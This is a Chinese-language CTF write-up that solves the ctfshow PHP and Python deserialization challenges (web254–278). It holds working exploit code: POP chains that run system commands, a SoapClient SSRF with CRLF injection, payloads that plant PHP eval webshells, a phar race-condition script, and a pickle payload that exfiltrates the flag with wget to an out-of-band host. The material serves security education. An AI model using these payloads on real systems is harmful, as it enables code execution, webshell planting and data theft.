---
title: "ctfshow Web入门[反序列化] Writeup"
date: 2022-08-16T15:49:49+08:00
draft: false
author: "X1r0z"

tags: ['php', 'python', 'ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

PHP 和 Python 的反序列化

Yii, Laravel, ThinkPHP 框架的题还没来得及做... 后面补上

<!--more-->

## web254

![20220814113351](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220814113351.png)

???

```
http://95d10ced-6ff7-47a7-811b-9e73df797b99.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
```

## web255

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141137658.png)

简单的反序列化, 注意改变 `$isVip` 的值

```php
<?php

class ctfShowUser{
    public $isVip = true;
};

echo serialize(new ctfShowUser());

?>
```

Cookie 要 urlencode

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141145465.png)

## web256

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141147379.png)

username 和 password 不能相等

payload

```php
<?php

class ctfShowUser{
    public $username = 'aaa';
    public $password = 'bbb';
    public $isVip = true;
};

echo serialize(new ctfShowUser());

?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141151958.png)

## web257

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141152760.png)

一个简单的 pop 链构造

public 的属性被序列化后会变成 `属性名`

protected 的属性被序列化后会变成 `%00*%00属性名`

private 的属性被序列化后会变成 `%00类名%00属性名`

这里需要提前 urlencode, 因为浏览器无法显示 00 空字符

```php
<?php

class ctfShowUser{
    private $username = '123';
    private $password = '123';
    private $class;
    
    function __construct($class){
        $this->class = $class;
    }
};

class backDoor{
    private $code = 'system("cat flag.php");';
}

$o = new ctfShowUser(new backDoor());

echo urlencode(serialize($o));

?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141200637.png)

## web258

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141205423.png)

和上一题类似

过滤了 `O:数字:` `C:数字:` 的形式, 可以在数字前面加上 `+` 绕过

然后之前的 private 全部改成 public 了...

```
user=O%3A%2B11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22123%22%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141215613.png)

## web259

flag.php

```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

index.php

```php
$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

内部类/原生类的反序列化

参考文章 [https://xz.aliyun.com/t/9293](https://xz.aliyun.com/t/9293)

当时解的时候直接伪造 xff 头就出来 flag 了...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141632423.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141632241.png)

预期解是利用 SoapClient 类进行 ssrf

当调用不存在的方法 (getFlag) 时, 会调用 SoapClient 类中的 `__call__()` 方法, 然后发送 http/https 请求

构造 post 数据包时还利用到了 CRLF 漏洞

参考文章

[https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html](https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html)

这里通过 User-Agent 进行 CRLF 注入来构造其它 header 头

payload

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_data = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1',
);

$user_agent = "Chrome\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".strlen($post_data)."\r\n\r\n".$post_data;

$o = new SoapClient(null,array('location' => $target,'user_agent'=>$user_agent,'uri'=>'test'));
echo urlencode(serialize($o));
?>
```

之后访问 flag.txt 得到 flag

## web260

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

???

```
http://aa5f46bc-7908-49d6-b6b0-02f95714a8aa.challenge.ctf.show/?ctfshow=ctfshow_i_love_36D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141700670.png)

## web261

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141702531.png)

提示是打 Redis

魔术方法列表 [https://www.php.net/manual/zh/language.oop5.magic.php](https://www.php.net/manual/zh/language.oop5.magic.php)

当 `__wakeup()` 和 `__unserialize()` 同时存在时, 仅会执行 `__unserialize()` 方法

当存在 `__serialize()` 时, `$data` 的值为该方法返回的数组, 否则为一个包含反序列化后的全部属性的数组

这里 `if($this->code==0x36d)` 使用了 `==` , 会进行类型转换

所以我们只需要构造一个以 0x36d 的十进制数 877 开头的文件名即可

```php
<?php

class ctfshowvip{
    public $username = '877.php';
    public $password = '<?php eval($_REQUEST[1]);?>';
}

echo serialize(new ctfshowvip());

?>
```

连接

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141755585.png)

Redis 在哪里???

## web262

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208142103003.png)

注释里面有个 message.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141802482.png)

本地构造了下

```php
<?php

class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';

}

echo base64_encode(serialize(new message()));

?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208141805960.png)

又非预期了???

这题考点其实是反序列化字符逃逸

参考文章

[https://xz.aliyun.com/t/9213](https://xz.aliyun.com/t/9213)

[https://www.cnblogs.com/Sayo-/p/15164265.html](https://www.cnblogs.com/Sayo-/p/15164265.html)

大致分为字符串长度增加和字符串长度减少两种情况, 如果替换前后长度相等是无法进行逃逸的

这里 `str_replace()` 将 fuck 替换为 loveU, 多了1个字符

我们需要构造一个序列化的 payload, 内容是 `token=admin`

```
";s:5:"token";s:5:"admin";}
```

注意闭合双引号, 以及最后的 `}`, 其中 `}` 表示反序列化的终止位置

总长度为27个字符

而每从一个 fuck 到 loveU 能够逃逸1个字符

总 payload 就是 fuck*27 + payload

因为这里属性的顺序是 `$from $msg $to $token`, 所以我们在 `$to` 里面填写 payload

```
http://9d5b992a-bfcf-4c6d-b525-60d3b1002d02.challenge.ctf.show/?f=123&m=123&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22;s:5:%22token%22;s:5:%22admin%22;}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208142113715.png)

访问 message.php 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208142113094.png)

## web263

一个登录页面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208142117048.png)

存在 www.zip

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208142119695.png)

/inc/inc.php 中的 User 类有一处 file_put_contents()

```php
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
```

文件开头

```php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('session.serialize_handler', 'php');
```

另外 index.php 中有一处可以设置 session 的点, 而且并没有引用上面的 inc.php

```php
error_reporting(0);
session_start();
//超过5次禁止登陆
if(isset($_SESSION['limit'])){
	$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
	$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
}else{
	setcookie("limit",base64_encode('1'));
	$_SESSION['limit']= 1;
}
```

check.php 开头

```php
error_reporting(0);
require_once 'inc/inc.php';
$GET = array("u"=>$_GET['u'],"pass"=>$_GET['pass']);
```



考点应该是 session 反序列化漏洞

不过找了一遍发现并没有 `unserialize()`, 如果想要反序列化的话, 那就得用到 `session.serialize_handler` 之间的差异性

这里引用下 lemon 师傅的表

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208151913970.png)

不过并不知道 php.ini 默认使用的 handler 是什么...

但因为 inc.php 里显式的设置了 php 这个 handler, 可以大胆猜测一下默认的是 php_serialize (?)

也就是说 index.php 使用 php_serialize handler 序列化我们传入的 cookie 值, 生成对应的 session 文件

而 inc.php 里使用 php handler 反序列化 session 文件

我们利用 php handler 中的 `|` 来进行反序列化

payload

```php
<?php

class User{
    public $username;
    public $password;
    function __construct(){
        $this->username = '123.php';
        $this->password = '<?php eval($_POST[1]);?>';
    }
}

echo base64_encode('|'.serialize(new User()));

?>
```

在前面加上 `|`, 这样的话 session 反序列化的时候 php handler 会默认把 `|` 前面的内容当做 key, 不会解析, `|` 后面的才是真正应该反序列化的 value

首先第一次访问 index.php, 得到 PHPSESSID

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152120918.png)

然后第二次访问 index.php, 在 cookie 中添加这个 PHPSESSID, 并且修改 limit 的值 (注意要将 `=` urlencode)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152121810.png)

最后访问 check.php (check.php 中引用了 /inc/inc.php)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152121428.png)

访问 /log-123.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152121213.png)

连接, 查看 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152122644.png)

这题试了好几遍, 一开始访问的是 /inc/inc.php, 文件能创建成功, 但是内容一直写不进去, 不知道什么原因, 之后再试就连文件都创建失败了...

后来改成了 /check.php, 就都能写进去了...

## web264

修复了 web262 中的非预期解, 改成了 session

还是 PHP 反序列化时的字符串逃逸, 方法同 web262

注意访问 message.php 的时候 cookie 里除了 PHPSESSID 以外, 别忘了加上 `msg=123` (任意值)

## web265

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152229732.png)

反序列化后 token 重新赋值, md5 加密的随机数

如果想要得到 flag 的话, password 必须跟 token 一模一样

想到了 PHP 中变量的引用 `&`

`&` 传递变量的地址, 类似于 c 中的指针

```php
<?php

$a = '123';
$b = &$a;
$a = '456';
echo $b;

?>
```

这里面 `$b` 的值就是 `$a` 的值, 因为 `$b` 里面存了 `$a` 的地址, 两者是等价的

同理, 如果改变 `$b` 的值, `$a` 的值也同样会改变

payload

```php
<?php

class ctfshowAdmin{
    public $token;
    public $password;

    function __construct(){
        $this->password = &$this->token;
    }
}

echo serialize(new ctfshowAdmin());

?>
```

```php
O:12:"ctfshowAdmin":2:{s:5:"token";N;s:8:"password";R:2;}
```

可以看到这里面 password 后的字符是 `R`, 代表引用 (Reference)

get 传参后得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152250505.png)

## web266

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152252120.png)

这里考察一个知识点, `__destruct()` 会在程序**正常**执行**完毕**后被调用

例如

```php
<?php

class MyDestructableClass 
{
    function __construct() {
        print "In constructor\n";
    }

    function __destruct() {
        print "Destroying " . __CLASS__ . "\n";
    }
}

$obj = new MyDestructableClass();

throw new Exception('test');

?>
```

如果不加最后一句的 throw, 会正常输出 `Destroying...`

但是有了 throw 之后, 程序将抛出异常

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152257465.png)

程序在 throw 处已经被终止了, 没有正常执行完毕, `__destruct()` 方法也就不会执行

回到题目中, 代码里的 `preg_match()` 没有加 `/i`, 猜测用大小写绕过?

```php
O:7:"CTFSHOW":0:{}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152300862.png)

后来搜了一下, 发现 PHP 有如下特性

> 1. 变量名区分大小写
> 2. 常量名区分大小写
> 3. 数组索引 (键名) 区分大小写
> 4. **函数名, 方法名, 类名不区分大小写**
> 5. 魔术常量不区分大小写 (以双下划线开头和结尾的常量)
> 6.  NULL TRUE FALSE 不区分大小写
> 7. 强制类型转换不区分大小写 (在变量前面加上 `(type)`)

## web267-270

Yii 框架的反序列化漏洞

待补充

## web271-273

Laravel 的反序列化漏洞

待补充

## web274

ThinkPHP 的反序列化漏洞

待补充

## web275

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208152332692.png)

filter 类 `__destruct` 方法中的 system 可以执行命令

文件名可控, 而且我们也可以构造出 `$evilfile = true` 的情况

get fn 传参

```
123; echo '<?php system($_GET[1]);?>' > 1.php
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208160004964.png)

## web276

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208160007351.png)

细微差异

```php
public function __destruct(){
    if($this->evilfile && $this->admin){
        system('rm '.$this->filename);
    }
}
```

`$admin` 不可控, 并且有文件操作的相关函数, 猜测是 phar:// 反序列化, 再加上条件竞争

思路是先绕过 checkevil 方法上传文件, 然后利用 copy 和 unlink 的时间差, 再利用一个正常的请求通过 phar:// 协议访问之前上传的文件, 触发反序列化

payload

```php
<?php

class filter{
    public $filename = '123; echo \'<?php system($_GET[1]);?>\' > 1.php';
    public $evilfile = true;
    public $admin = true;
}

$o = new filter();

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();

?>
```

python 脚本

```python
import requests
import threading

url = 'http://179e7299-1f16-42cf-a60f-6a8f10dec64b.challenge.ctf.show/'

lock = False

def send_phar():
    with open('phar.phar', 'rb') as f:
        data = f.read()
    _ = requests.post(url + '?fn=phar.txt', data=data)

def unserialize_phar():
    _ = requests.post(url + '?fn=phar://phar.txt', data='123')

def check_shell():
    global lock
    res = requests.get(url + '1.php')
    if res.status_code != 404:
        print('ok')
        lock = True

while not lock:
    t1 = threading.Thread(target=send_phar)
    t2 = threading.Thread(target=unserialize_phar)
    t3 = threading.Thread(target=check_shell)
    t1.start()
    t2.start()
    t3.start()
```

一开始用 brup 跑死活跑不出来... 结果写成 python 脚本很快就出来了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208161152844.png)

## web277

右键查看源码有个注释

```html
<!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) -->
```

python pickle 反序列化

参考文章 [https://xz.aliyun.com/t/7436](https://xz.aliyun.com/t/7436)

这里直接利用 `__reduce__` 执行命令

```python
import pickle
import base64
import os

class RCE(object):
    def __reduce__(self):
        return (os.system,('wget http://y98rjviy0w8i1gyj75swgrzlocu2ir.oastify.com/`cat flag`',))

obj = RCE()
payload = pickle.dumps(obj, protocol=0)
print(base64.b64encode(payload))
```

注意要在 linux 下运行

因为 windows 执行 os.system 的时候 opcode 开头是 nt, 而 linux 的开头是 posix

自己手动改也可以

```
http://536110ee-d022-4b6c-ab8b-4cc7fe52932e.challenge.ctf.show/backdoor?data=Y3Bvc2l4CnN5c3RlbQpwMAooVndnZXQgaHR0cDovL3k5OHJqdml5MHc4aTFneWo3NXN3Z3J6bG9jdTJpci5vYXN0aWZ5LmNvbS9gY2F0IGZsYWdgCnAxCnRwMgpScDMKLg==
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208161538219.png)

## web278

hint 提示过滤了 os.system

换成 os.popen, 其它同上
